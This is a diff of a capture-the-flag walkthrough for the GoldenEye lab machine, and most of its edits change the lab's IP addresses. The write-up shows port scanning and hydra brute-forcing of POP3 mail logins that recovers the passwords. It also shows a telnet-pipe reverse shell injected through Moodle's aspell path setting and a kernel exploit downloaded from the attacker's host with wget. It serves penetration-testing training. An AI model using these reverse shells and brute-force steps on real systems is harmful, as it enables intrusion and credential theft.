@@ -22,9 +22,9 @@ Package listing: from current OS
 # nmap
 
 ```bash
-sudo nmap -sT -sV -A -Pn -n -p- 192.168.110.8
+sudo nmap -sT -sV -A -Pn -n -p- 192.168.56.101
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-04 16:39 CET
-Nmap scan report for 192.168.110.8
+Nmap scan report for 192.168.56.101
 Host is up (0.00047s latency).
 Not shown: 65531 closed tcp ports (conn-refused)
 PORT      STATE SERVICE  VERSION
@@ -58,7 +58,7 @@ Network Distance: 1 hop
 
 TRACEROUTE
 HOP RTT     ADDRESS
-1   0.47 ms 192.168.110.8
+1   0.47 ms 192.168.56.101
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 28.89 seconds
@@ -66,8 +66,11 @@ Nmap done: 1 IP address (1 host up) scanned in 28.89 seconds
 
 # curl
 
+
+
+
 ```bash
-curl http://192.168.110.8/terminal.js
+curl http://192.168.56.101/terminal.js
 ```
 ## terminal.js
 
@@ -135,17 +138,20 @@ InvincibleHack3r
 
 # Scan dir
 
-```bash
-$ dirb  http://192.168.110.8/sev-home/ -u boris:InvincibleHack3r -X .php
-gobuster dir -u http://192.168.110.8/sev-home/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --username boris --password  InvincibleHack3r -x php,txt
 
-$ wfuzz -c -w users.txt -w passwords.txt --basic FUZZ:FUZ2Z -u http://192.168.110.8/sev-home --hc 401
+Naviagate to /sev-home/ to login
+
+```bash
+$ dirb  http://192.168.56.101/sev-home/ -u boris:InvincibleHack3r -X .php
+gobuster dir -u http://192.168.56.101/sev-home/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --username boris --password  InvincibleHack3r -x php,txt
+
+$ wfuzz -c -w users.txt -w passwords.txt --basic FUZZ:FUZ2Z -u http://192.168.56.101/sev-home --hc 401
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
 ********************************************************
 
-Target: http://192.168.110.8/sev-home
+Target: http://192.168.56.101/sev-home
 Total requests: 20
 
 =====================================================================
@@ -160,28 +166,28 @@ Requests/sec.: 0
 
 
 
-└─$ hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3s://192.168.110.8 -s 55006
+└─$ hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3s://192.168.56.101 -s 55006
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-14 22:10:31
 [INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
-[DATA] attacking pop3s://192.168.110.8:55006/
+[DATA] attacking pop3s://192.168.56.101:55006/
 [STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
 [STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
-[55006][pop3] host: 192.168.110.8   login: boris   password: secret1!
+[55006][pop3] host: 192.168.56.101   login: boris   password: secret1!
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-14 22:13:11
 
 
                         
 ┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
-└─$ gobuster dir -u http://192.168.110.8 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --username boris --password  InvincibleHack3r -x php,txt
+└─$ gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --username boris --password  InvincibleHack3r -x php,txt
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url:                     http://192.168.110.8
+[+] Url:                     http://192.168.56.101
 [+] Method:                  GET
 [+] Threads:                 10
 [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
@@ -200,15 +206,15 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 
 
-└─$ hydra -l natalya -P /usr/share/wordlists/fasttrack.txt pop3s://192.168.110.8 -s 55006
+└─$ hydra -l natalya -P /usr/share/wordlists/fasttrack.txt pop3s://192.168.56.101 -s 55006
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-14 22:16:07
 [INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
-[DATA] attacking pop3s://192.168.110.8:55006/
+[DATA] attacking pop3s://192.168.56.101:55006/
 [STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
-[55006][pop3] host: 192.168.110.8   login: natalya   password: bird
+[55006][pop3] host: 192.168.56.101   login: natalya   password: bird
 [STATUS] 111.00 tries/min, 222 tries in 00:02h, 1 to do in 00:01h, 15 active
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-14 22:18:07
@@ -217,9 +223,9 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-14 22:18:
 ```
 
 ┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
-└─$ telnet 192.168.110.8 55007
-Trying 192.168.110.8...
-Connected to 192.168.110.8.
+└─$ telnet 192.168.56.101 55007
+Trying 192.168.56.101...
+Connected to 192.168.56.101.
 Escape character is '^]'.
 +OK GoldenEye POP3 Electronic-Mail System
 user boris
@@ -280,11 +286,14 @@ Once Xenia gets access to the training site and becomes familiar with the Golden
 
 PS - Keep security tight or we will be compromised.
 
-.
+quit
++OK Logging out.
+Connection closed by foreign host.
 
-└─$ telnet 192.168.110.8 55007
-Trying 192.168.110.8...
-Connected to 192.168.110.8.
+
+└─$ telnet 192.168.56.101 55007
+Trying 192.168.56.101...
+Connected to 192.168.56.101.
 Escape character is '^]'.
 +OK GoldenEye POP3 Electronic-Mail System
 user natalya
@@ -338,6 +347,10 @@ And if you didn't have the URL on outr internal Domain: severnaya-station.com/gn
 
 Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
 
+quit
++OK Logging out.
+Connection closed by foreign host.
+
 
 
 http://severnaya-station.com/gnocertdir/blog/index.php?courseid=0
@@ -361,22 +374,22 @@ Dr. Doak "The Doctor"
 
 
 
-└─$ hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3s://192.168.110.8 -s 55006
+└─$ hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3s://192.168.56.101 -s 55006
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-15 07:16:57
 [INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
-[DATA] attacking pop3s://192.168.110.8:55006/
-[55006][pop3] host: 192.168.110.8   login: doak   password: goat
+[DATA] attacking pop3s://192.168.56.101:55006/
+[55006][pop3] host: 192.168.56.101   login: doak   password: goat
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-15 07:18:43
        
 
 
-└─$ telnet 192.168.110.8 55007
-Trying 192.168.110.8...
-Connected to 192.168.110.8.
+└─$ telnet 192.168.56.101 55007
+Trying 192.168.56.101...
+Connected to 192.168.56.101.
 Escape character is '^]'.
 +OK GoldenEye POP3 Electronic-Mail System
 user doak                                                                               
@@ -487,7 +500,7 @@ Payload options (cmd/unix/reverse):
 
    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
-   LHOST  192.168.110.1    yes       The listen address (an interface may be specified)
+   LHOST  192.168.56.1    yes       The listen address (an interface may be specified)
    LPORT  4444             yes       The listen port
 
 
@@ -500,7 +513,7 @@ Exploit target:
 
 msf6 exploit(multi/http/moodle_cmd_exec) > run
 
-[*] Started reverse TCP double handler on 192.168.110.1:4444 
+[*] Started reverse TCP double handler on 192.168.56.1:4444 
 [*] Authenticating as user: admin
 [-] Exploit aborted due to failure: no-access: Login failed
 [*] Exploit completed, but no session was created.
@@ -510,8 +523,9 @@ msf6 exploit(multi/http/moodle_cmd_exec) >
 
 
 Site administration --> Plugins --> Text editors --> TinyMCE HTML editor -->  Spell engine : PSpellShell
-Site administration --> Server --> System paths --> Path to aspell : sh -c '(sleep 4062|telnet 192.168.110.1 3333 | /bin/bash | telnet 192.168.110.1 4444 &)'
+Site administration --> Server --> System paths --> Path to aspell : sh -c '(sleep 4062|telnet 192.168.56.1 3333 | /bin/bash | telnet 192.168.56.1 4444 &)'
 
+sh -c '(sleep 4062|telnet 192.168.56.1 3333 | /bin/bash | telnet 192.168.56.1 4444 &)'
 
 sh -c '/tmp/rev'
 2020
@@ -537,10 +551,10 @@ drwxr-xr-x  4 natalya natalya 4096 Apr 28  2018 natalya
    Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
    Download URL: https://www.exploit-db.com/download/37292
 
-www-data@ubuntu:/var/www/html/dir007key$ wget http://192.168.110.1:8888/37292
-wget http://192.168.110.1:8888/37292
---2021-04-14 12:19:43--  http://192.168.110.1:8888/37292
-Connecting to 192.168.110.1:8888... connected.
+www-data@ubuntu:/var/www/html/dir007key$ wget http://192.168.56.1:8888/37292
+wget http://192.168.56.1:8888/37292
+--2021-04-14 12:19:43--  http://192.168.56.1:8888/37292
+Connecting to 192.168.56.1:8888... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 17592 (17K) [application/octet-stream]
 Saving to: '37292'
@@ -580,7 +594,7 @@ If you captured this make sure to go here.....
 
 
 sh -c '(sleep 4062|telnet 192.168.230.132 4444|while : ; do sh && break; done 2>&1|telnet 192.168.230.132 4444 >/dev/null 2>&1 &)'
-sh -c '(sleep 4062|telnet 192.168.110.1 3333 | /bin/bash | telnet 192.168.110.1 4444 &)'
+sh -c '(sleep 4062|telnet 192.168.56.1 3333 | /bin/bash | telnet 192.168.56.1 4444 &)'
 
 telnet <attacker_ip> <port1> | /bin/bash | telnet <attacker_ip> <port2>
 ```
@@ -767,3 +781,8 @@ execle("/bin/sh", "sh", "-i", NULL, NULL);
 }
 
 ```
+
+
+# TODO
+
+Add news files on "sev-home" directory then scan it!
